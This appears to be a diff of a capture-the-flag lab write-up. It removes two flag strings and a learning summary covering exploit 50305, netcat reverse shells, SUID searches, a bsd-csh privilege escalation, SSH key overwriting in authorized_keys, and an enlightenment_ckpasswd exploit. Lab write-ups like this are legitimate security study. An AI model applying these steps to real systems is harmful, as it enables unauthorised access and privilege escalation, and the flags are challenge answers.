@@ -452,8 +452,6 @@ be a script kiddie, I am also talking to myself---
 # ls
 root.txt  snap
 # cat root.txt
-HMV3nl1gth3nm3n7
-
 ---Root User Flag---
 
 
@@ -467,71 +465,9 @@ HMV3nl1gth3nm3n7
 # ls
 fos  user.txt
 # cat user.txt	
-HMVn03145n4nk4
-
 ---First User Flag---
 
 
 ---We got both the flags, congrats---
 
 
-
-
-WHAT I LEARNED:
-
-+ I learned that I should check searchsploit for possible technologies or that the target system uses:
-
-	searchsploit Online Food Ordering System
-
-	searchsploit -m 50305
-
-	cat 50305.py
-
-	python 50305.py
-
-
-+ I learned that this exploit opens a shell, but for better connection juts use a python reverse shell and
-use netcat to gain access with a slightly better shell
-
-
-+ Always check for better using:
-
-	find / -perm -u=s -type f 2>/dev/null
-
-
-+ I saw a file that which is a C shell that can be used to gain more permissions:
-
-	/usr/bin/bsd-csh
-
-then I checked gtfobins.com and found a priv escalate vector for bsd-csh:
-
-	./csh -b
-
-modified it so we can use it
-
-	/usr/bin/bsd-csh -b
- 
-
-+ I learned that after discovering a .ssh folder and a authorized_keys file in it, which means the public key,
-we can just create a private and public key using:
-
-	ssh-keygen -t rsa
-
-and then copy the content of our own public key, overwrite it to the target system's public key and then 
-log into the ssh server using the private key:
-
-	ssh -i luz aelis@10.0.2.66
-
-
-+ After logging into the ssh server, I used an exploit for another file that I discovered when I was checking
-for permissions:
-
-	/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_ckpasswd
-
-I checked online and found an exploit, created a sh file and write the content of the exploit into the 
-sh script	 
-
-
-
-Tools and methods I have used: nmap, gobuster, searchsploit, 50305 exploit, nc, gtfobins, 
-a privilege escalation script for the "enlightenment_ckpasswd"
